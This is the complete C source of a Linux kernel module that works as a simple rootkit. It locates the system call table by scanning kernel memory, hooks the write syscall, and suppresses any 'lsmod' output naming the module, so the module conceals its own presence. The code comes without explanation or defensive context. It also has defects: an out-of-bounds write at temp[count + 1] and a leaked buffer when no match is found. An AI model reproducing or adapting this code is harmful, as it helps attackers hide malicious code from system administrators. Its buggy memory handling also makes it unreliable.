#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

MODULE_LICENSE ("GPL");

#define MODULE_NAME "hide_module"

int (*orig_write)(int, const char*, size_t);

unsigned long* sys_call_table;

void find_sys_call_table(void)
{
  int i;
  unsigned long *ptr;
  unsigned long arr[4];
  ptr = (unsigned long *)((init_mm.end_code + 4) & 0xfffffffc);
  while ((unsigned long)ptr < (unsigned long)init_mm.end_data) {
    if (*ptr == (unsigned long)((unsigned long *)sys_close)) {
	for (i = 0; i < 4; i++) {
	  arr[i] = *(ptr + i);
	  arr[i] = (arr[i] >> 16) & 0x0000ffff;
	}
	if (arr[0] != arr[2] || arr[1] != arr[3]) {
	  sys_call_table = (ptr - __NR_close);
	  break;
	}
    }
    ptr++;
  }
}


int new_write(int fd, const char* buf, size_t count)
{
  char *temp;
  int ret;

  if (!strcmp(current->comm, "lsmod")) {
    temp = (char *)kmalloc(count + 1, GFP_KERNEL);
    copy_from_user(temp, buf, count);
    temp[count + 1] = 0;
    if (strstr(temp, MODULE_NAME) != NULL) {
      kfree(temp);
      return count;
    }
  }
  ret = orig_write(fd, buf, count);
  return ret;
}


int init_module(void)
{
  find_sys_call_table();
  orig_write = (void*)sys_call_table[__NR_write];
  sys_call_table[__NR_write] = (unsigned long)new_write;
  return 0;
}


void cleanup_module(void)
{
  sys_call_table[__NR_write] = (unsigned long)orig_write;
}
